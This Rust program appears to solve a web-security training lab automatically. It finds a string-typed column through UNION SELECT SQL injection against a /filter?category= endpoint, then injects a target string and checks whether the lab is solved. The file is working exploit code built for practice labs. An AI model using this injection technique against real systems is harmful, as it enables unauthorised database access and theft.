use sql_injection::{
    HTTP_CLIENT, check_is_lab_solved, fetch_target_string, find_columns_of_type_string,
    find_no_of_columns, generate_clap_parser,
};

fn main() {
    let args = generate_clap_parser();

    let lab_url = args.lab_url.as_str().trim_end_matches("/");
    let lab_url_with_endpoint = format!("{lab_url}/filter?category=");

    let target_string = fetch_target_string(lab_url, None);

    let columns = find_no_of_columns(&lab_url_with_endpoint, None, None);

    let target_columns = find_columns_of_type_string(&lab_url_with_endpoint, columns, None, None);

    logger::info("Querying the target string...");

    let payload = (0..columns)
        .map(|column| {
            if target_columns.contains(&column) {
                format!("'{}'", target_string)
            } else {
                "NULL".to_string()
            }
        })
        .collect::<Vec<String>>()
        .join(", ");

    let query = format!("' UNION SELECT {}--", payload);

    if HTTP_CLIENT
        .get(format!("{}/filter?category={}", lab_url, query))
        .send()
        .expect("[-] Failed to query the target string")
        .status()
        == 200
    {
        logger::success("The string is queried successfully");
    } else {
        logger::error("Failed to query the string");
    }

    check_is_lab_solved(lab_url);
}
